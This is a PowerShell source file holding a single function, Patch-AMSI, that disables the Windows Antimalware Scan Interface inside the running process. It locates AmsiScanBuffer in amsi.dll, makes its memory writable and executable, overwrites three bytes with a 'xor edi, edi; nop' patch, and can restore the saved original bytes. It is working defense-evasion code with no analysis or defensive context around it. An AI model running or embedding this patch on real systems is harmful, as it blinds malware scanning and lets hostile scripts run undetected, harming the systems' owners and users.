function Patch-AMSI {
    param(
        [byte[]] $restoreBytes = $null
    )

    # Define P/Invoke signatures for the necessary Windows API functions
    $sig = @'
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
[DllImport("kernel32.dll", EntryPoint="RtlMoveMemory", SetLastError=false)] public static extern void MoveMemory(IntPtr dest, IntPtr src, int count);
[DllImport("kernel32.dll")] public static extern void CopyMemory(IntPtr dest, IntPtr src, int count);
'@


    # Add the defined P/Invoke methods to the PowerShell session
    Add-Type -MemberDefinition $sig -Name 'Win32Api' -Namespace 'Win32'

    # Load the amsi.dll
    $dllHandle = [Win32.Win32Api]::LoadLibrary("amsi.dll")
    if ($dllHandle -eq [IntPtr]::Zero) {
        Write-Debug "Failed to load amsi.dll"
        return
    }

    # Get the address of AmsiScanBuffer
    $amsiScanBufferAddr = [Win32.Win32Api]::GetProcAddress($dllHandle, "AmsiScanBuffer")
    if ($amsiScanBufferAddr -eq [IntPtr]::Zero) {
        Write-Debug "Failed to get address of AmsiScanBuffer"
        return
    }

    # Change the memory protection to allow writing to the function
    $oldProtection = 0
    $pageSize = 0x0015
    $newProtection = 0x40 # PAGE_EXECUTE_READWRITE
    $virtualProtectResult = [Win32.Win32Api]::VirtualProtect($amsiScanBufferAddr, $pageSize, $newProtection, [ref]$oldProtection)
    if (-not $virtualProtectResult) {
        Write-Debug "Failed to change memory protection"
        return
    }

    # Define the patch to disable AMSI (xor edi, edi; nop)
    $patch = [byte[]](0x31, 0xFF, 0x90)

    # Allocate unmanaged memory and copy the patch
    $unmanagedPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $unmanagedPointer, 3)

    # Perform the pointer arithmetic manually by casting IntPtr to long
    $offset = 0x001b
    $targetAddress = [IntPtr]([Int64]$amsiScanBufferAddr + $offset)

    if ($restoreBytes) {
        # If restoreBytes is provided, restore the original bytes
        $unmanagedPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($restoreBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($restoreBytes, 0, $unmanagedPointer, $restoreBytes.Length)
        [Win32.Win32Api]::MoveMemory($targetAddress, $unmanagedPointer, $restoreBytes.Length)
        Write-Debug "Memory restored successfully"
    } else {
        # No restoreBytes provided, return the bytes being overwritten

        # Allocate unmanaged memory to hold the original bytes
        $originalBytes = New-Object byte[] 3
        $unmanagedPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(3)

        # Copy the original bytes from the target memory address
        [Win32.Win32Api]::CopyMemory($unmanagedPointer, $targetAddress, 3)
        [System.Runtime.InteropServices.Marshal]::Copy($unmanagedPointer, $originalBytes, 0, 3)

        # Now patch the memory with the new bytes
        $patchPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(3)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $patchPointer, 3)
        [Win32.Win32Api]::MoveMemory($targetAddress, $patchPointer, 3)

        # Return the original bytes
        return $originalBytes
    }
}
